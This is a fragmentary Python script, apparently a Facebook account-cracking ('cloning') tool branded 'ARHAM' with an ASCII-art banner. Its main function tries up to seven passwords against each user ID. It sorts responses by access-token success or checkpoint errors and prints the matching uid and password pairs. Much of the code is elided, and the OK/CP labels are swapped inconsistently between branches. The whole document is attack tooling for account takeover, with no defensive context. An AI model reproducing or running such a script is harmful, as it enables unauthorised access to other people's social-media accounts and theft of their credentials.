...
logo = """                                          
    .S_SSSs     .S_sSSs     .S    S.    .S_SSSs     .S_SsS_S.   
.SS~SSSSS   .SS~YS%%b   .SS    SS.  .SS~SSSSS   .SS~S*S~SS.  
S%S   SSSS  S%S   `S%b  S%S    S%S  S%S   SSSS  S%S `Y' S%S  
S%S    S%S  S%S    S%S  S%S    S%S  S%S    S%S  S%S     S%S  
S%S SSSS%S  S%S    d*S  S%S SSSS%S  S%S SSSS%S  S%S     S%S  
S&S  SSS%S  S&S   .S*S  S&S  SSS&S  S&S  SSS%S  S&S     S&S  
S&S    S&S  S&S_sdSSS   S&S    S&S  S&S    S&S  S&S     S&S  
S&S    S&S  S&S~YSY%b   S&S    S&S  S&S    S&S  S&S     S&S  
S*S    S&S  S*S   `S%b  S*S    S*S  S*S    S&S  S*S     S*S  
S*S    S*S  S*S    S%S  S*S    S*S  S*S    S*S  S*S     S*S  
S*S    S*S  S*S    S&S  S*S    S*S  S*S    S*S  S*S     S*S  
SSS    S*S  S*S    SSS  SSS    S*S  SSS    S*S  SSS     S*S  
       SP   SP                 SP          SP           SP   
       Y    Y                  Y           Y            Y    
	...
	def main(arg):
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		        ...
		        print("\033[1;95m ARHAM OK] "+uid+" = "+pass1)
		    	...
		    	if "access_token" in d:
		            ...
		            print("\x1b[1;92mARHAM CP] "+uid+" = "+pass1+"\x1b[1;0m")
		            ...
		            if 'www.facebook.com' in d['error_msg']:
		                ...
		                print("\033[1;95mARHAM OK] "+uid+" = "+pass2)
		                ...
		                if 'access_token' in d:
		                    ...
		                    print("\x1b[1;92mARHAM CP] "+uid+" = "+pass2+"\x1b[1;0m")
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        print("\033[1;92mARHAM OK] "+uid+" = "+pass3)
		                        ...
		                        if 'access_token' in d:
		                            ...
		                            print("\x1b[1;92mARHAM CP] "+uid+" = "+pass3+"\x1b[1;0m")
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                print("\033[1;92mARHAM CP] "+uid+" = "+pass4)
		                                ...
		                                if 'access_token' in d:
		                                    ...
		                                    print("\x1b[1;92mARHAM OK] "+uid+" = "+pass4+"\x1b[1;0m")
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        print("\033[1;95mARHAM CP "+uid+" = "+pass5)
		                                        ...
		                                        if 'access_token' in d:
		                                            ...
		                                            print("\x1b[1;92mARHAM OK] "+uid+" = "+pass5+"\x1b[1;0m")
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                print("\033[1;92mARHAM CP] "+uid+" = "+pass6)
		                                                ...
		                                                if 'access_token' in d:
		                                                    ...
		                                                    print("\x1b[1;92mARHAM OK] "+uid+" = "+pass6+"\x1b[1;0m")
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        print("\033[1;92mARHAM CP] "+uid+" = "+pass7)
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            ...
		                                                            print("\x1b[1;92mARHAM OK] "+uid+" = "+pass7+"\x1b[1;0m")
